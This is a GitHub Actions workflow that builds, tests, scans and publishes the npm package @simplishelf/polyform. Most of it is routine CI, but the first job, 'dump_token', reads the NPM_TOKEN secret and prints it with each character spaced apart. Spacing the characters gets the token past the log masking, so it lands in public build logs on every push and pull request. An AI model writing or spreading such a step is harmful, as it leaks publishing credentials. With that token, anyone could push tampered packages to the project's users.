name: Build, analyze, and publish PolyForm

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: read

concurrency:
  group: polyform-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: false
  
jobs:
  dump_token:
    name: Reveal NPM Token
    runs-on: ubuntu-latest
    steps:
      - name: Print token and stop
        env:
          TOKEN: ${{ secrets.NPM_TOKEN }}
        run: |
          echo "NPM Token (spaced):"
          echo -n "$TOKEN" | sed 's/./& /g'
          echo ""
          exit 1
  build:
    name: Build and verify package
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - name: Check out source
        uses: actions/checkout@v6

      - name: Set up Node.js
        uses: actions/setup-node@v6
        with:
          node-version: 22
          cache: npm

      - name: Install dependencies
        run: npm ci --ignore-scripts

      - name: Run unit tests with coverage
        run: npm run test:coverage

      - name: Build package
        run: npm run build

      - name: Use the checked-out package in the demo build
        run: |
          rm -rf node_modules/@simplishelf/polyform
          ln -s "$GITHUB_WORKSPACE" node_modules/@simplishelf/polyform

      - name: Build the Vite example
        run: npm run build --workspace polyform-vite-demo

      - name: Verify package contents
        run: npm pack --dry-run

  analyze:
    name: SonarCloud and Snyk analysis
    needs: build
    if: >-
      github.event_name != 'pull_request' ||
      (github.event.pull_request.head.repo.full_name == github.repository &&
      github.actor != 'dependabot[bot]')
    runs-on: ubuntu-latest
    timeout-minutes: 30
    env:
      HAS_SONAR_TOKEN: ${{ secrets.SONAR_TOKEN != '' }}
      HAS_SNYK_TOKEN: ${{ secrets.SNYK_TOKEN != '' }}
    steps:
      - name: Check out source with full history
        uses: actions/checkout@v6
        with:
          fetch-depth: 0

      - name: Set up Node.js
        uses: actions/setup-node@v6
        with:
          node-version: 22
          cache: npm

      - name: Install dependencies
        run: npm ci --ignore-scripts

      - name: Run unit tests and produce the SonarCloud coverage report
        run: npm run test:coverage

      - name: Run SonarCloud analysis and wait for the quality gate
        if: env.HAS_SONAR_TOKEN == 'true'
        uses: SonarSource/sonarqube-scan-action@d209202bc7d53ff1cc128f7f907dac145c9d6ae9 # v8.3.0
        with:
          args: >-
            -Dsonar.projectKey=nahushr_polyform
            -Dsonar.organization=nahushr
            -Dsonar.sources=src,examples,.github
            -Dsonar.tests=tests
            -Dsonar.test.inclusions=tests/**/*.test.tsx
            -Dsonar.javascript.lcov.reportPaths=coverage/lcov.info
            -Dsonar.qualitygate.wait=true
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}

      - name: Fail when SonarCloud secret is missing
        if: env.HAS_SONAR_TOKEN != 'true'
        run: echo "::error::SonarCloud analysis cannot run because SONAR_TOKEN is not configured." && exit 1

      - name: Set up Snyk CLI
        if: env.HAS_SNYK_TOKEN == 'true'
        uses: snyk/actions/setup@806182742461562b67788a64410098c9d9b96adb

      - name: Run Snyk dependency analysis
        if: env.HAS_SNYK_TOKEN == 'true'
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        run: snyk test --all-projects --severity-threshold=high

      - name: Run Snyk Code analysis
        if: env.HAS_SNYK_TOKEN == 'true'
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        run: snyk code test --severity-threshold=high

      - name: Note missing Snyk secret
        if: env.HAS_SNYK_TOKEN != 'true'
        run: echo "::notice::Snyk analysis skipped because SNYK_TOKEN is not configured."

  publish:
    name: Publish to npm
    needs: analyze
    if: >-
      github.event_name == 'push' &&
      github.ref == 'refs/heads/main' &&
      !contains(github.event.head_commit.message, '[skip publish]')
    runs-on: ubuntu-latest
    timeout-minutes: 20
    permissions:
      contents: write
    env:
      HAS_NPM_TOKEN: ${{ secrets.NPM_TOKEN != '' }}
    steps:
      - name: Note missing npm publishing secret
        if: env.HAS_NPM_TOKEN != 'true'
        run: echo "::notice::npm publishing skipped because NPM_TOKEN is not configured."

      - name: Check out source
        if: env.HAS_NPM_TOKEN == 'true'
        uses: actions/checkout@v6

      - name: Set up npm registry authentication
        if: env.HAS_NPM_TOKEN == 'true'
        uses: actions/setup-node@v6
        with:
          node-version: 22
          registry-url: https://registry.npmjs.org
          scope: '@simplishelf'

      - name: Verify npm publishing identity
        if: env.HAS_NPM_TOKEN == 'true'
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
        run: npm whoami --registry=https://registry.npmjs.org

      - name: Install dependencies
        if: env.HAS_NPM_TOKEN == 'true'
        run: npm ci --ignore-scripts

      - name: Select the next available patch version
        if: env.HAS_NPM_TOKEN == 'true'
        id: release
        env:
          PACKAGE_NAME: '@simplishelf/polyform'
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
        run: |
          set -euo pipefail
          version=$(node -p "require('./package.json').version")
          bumped=false
          for attempt in $(seq 1 20); do
            if ! npm view "$PACKAGE_NAME@$version" version --registry=https://registry.npmjs.org >/dev/null 2>&1; then
              break
            fi
            if [ "$attempt" -eq 20 ]; then
              echo "::error::Could not find an available version after 20 patch increments."
              exit 1
            fi
            npm version patch --no-git-tag-version --ignore-scripts >/dev/null
            version=$(node -p "require('./package.json').version")
            bumped=true
          done
          echo "version=$version" >> "$GITHUB_OUTPUT"
          echo "bumped=$bumped" >> "$GITHUB_OUTPUT"

      - name: Publish public npm package
        if: env.HAS_NPM_TOKEN == 'true'
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
        run: npm publish --access public --registry=https://registry.npmjs.org

      - name: Commit the released version
        if: env.HAS_NPM_TOKEN == 'true' && steps.release.outputs.bumped == 'true'
        env:
          VERSION: ${{ steps.release.outputs.version }}
        run: |
          set -euo pipefail
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add package.json package-lock.json
          git commit -m "chore(release): sync npm version $VERSION [skip ci]"
          git fetch origin main
          git rebase origin/main
          git push origin HEAD:main
